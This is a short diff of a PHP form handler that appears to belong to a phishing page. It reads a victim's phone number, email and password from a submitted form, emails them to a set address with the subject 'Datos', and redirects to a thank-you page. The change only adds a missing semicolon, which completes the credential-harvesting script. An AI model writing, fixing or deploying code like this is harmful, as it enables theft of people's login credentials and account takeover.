@@ -5,6 +5,6 @@ $correo= $_POST["correo"];
 $contrasena= $_POST["contrasena"];
 $contenido= "Telefono: ". $telefono . "\nCorreo: " . $correo ."\nContraseña: " . $contrasena;
 mail($destino, "Datos", $contenido);
-header("location:gracias.html")
+header("location:gracias.html");
 
 ?>
